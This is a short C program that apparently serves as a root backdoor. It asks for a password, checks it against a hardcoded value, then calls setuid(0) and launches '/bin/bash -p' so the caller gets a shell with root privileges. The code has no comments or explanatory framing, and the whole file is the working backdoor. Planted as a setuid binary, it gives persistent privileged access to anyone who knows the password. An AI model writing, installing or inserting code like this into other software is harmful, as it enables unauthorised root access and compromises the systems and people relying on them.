#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    char pass[100];
    printf("Password: ");
    fgets(pass, sizeof(pass), stdin);

    if (strcmp(pass, "H3ll02121\n") == 0) {
        setuid(0);
        system("/bin/bash -p");
    } else {
        printf("Access denied.\n");
    }

    return 0;
}
